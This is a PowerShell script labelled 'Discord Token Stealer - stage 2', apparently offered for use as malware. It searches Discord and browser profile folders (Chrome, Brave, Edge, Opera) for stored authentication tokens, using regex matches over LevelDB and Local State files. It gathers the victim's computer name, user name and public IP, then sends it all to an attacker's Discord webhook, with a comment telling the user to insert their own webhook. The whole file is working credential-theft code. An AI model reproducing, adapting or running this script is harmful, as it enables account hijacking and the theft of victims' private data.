# Discord Token Stealer - stage 2
# Replace WEBHOOK with your Discord webhook

$Webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"

function Send-Discord($content) {
    try {
        $body = @{ content = $content } | ConvertTo-Json
        Invoke-RestMethod -Uri $Webhook -Method Post -Body $body -ContentType "application/json"
    } catch {}
}

function Get-DiscordTokens {
    $tokens = @()
    $paths = @(
        "$env:APPDATA\Discord",
        "$env:APPDATA\discordcanary",
        "$env:APPDATA\discordptb",
        "$env:APPDATA\discorddevelopment",
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default",
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 1",
        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default",
        "$env:APPDATA\Opera Software\Opera Stable",
        "$env:APPDATA\Opera Software\Opera GX Stable"
    )

    $regex = '[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}'
    $regex2 = 'mfa\.[\w-]{80,90}'

    foreach ($p in $paths) {
        if (!(Test-Path $p)) { continue }

        # LevelDB files
        $leveldb = Join-Path $p "Local Storage\leveldb"
        if (Test-Path $leveldb) {
            Get-ChildItem "$leveldb\*.ldb","$leveldb\*.log" -ErrorAction SilentlyContinue | ForEach-Object {
                try {
                    $content = [System.IO.File]::ReadAllText($_.FullName)
                    [regex]::Matches($content, $regex)  | ForEach-Object { $tokens += $_.Value }
                    [regex]::Matches($content, $regex2) | ForEach-Object { $tokens += $_.Value }
                } catch {}
            }
        }

        # also check Local State / Preferences for encrypted tokens (basic)
        $localState = Join-Path $p "Local State"
        if (Test-Path $localState) {
            try {
                $ls = Get-Content $localState -Raw
                [regex]::Matches($ls, $regex) | ForEach-Object { $tokens += $_.Value }
            } catch {}
        }
    }

    return $tokens | Select-Object -Unique
}

# Collect
$found = Get-DiscordTokens
$ip = try { (Invoke-RestMethod -Uri "https://api.ipify.org") } catch { "unknown" }
$pc = $env:COMPUTERNAME
$user = $env:USERNAME

# Build message
$msg = "**Discord Token Stealer**`n"
$msg += "PC: `$pc`nUser: `$user`nIP: `$ip`n"
$msg += "Tokens found: $($found.Count)`n`n"

if ($found.Count -eq 0) {
    $msg += "No tokens found."
} else {
    $i = 1
    foreach ($t in $found) {
        $msg += "``$i`` ``$t```n"
        $i++
        if ($msg.Length -gt 1800) {
            Send-Discord $msg
            $msg = ""
        }
    }
}

if ($msg.Length -gt 0) { Send-Discord $msg }
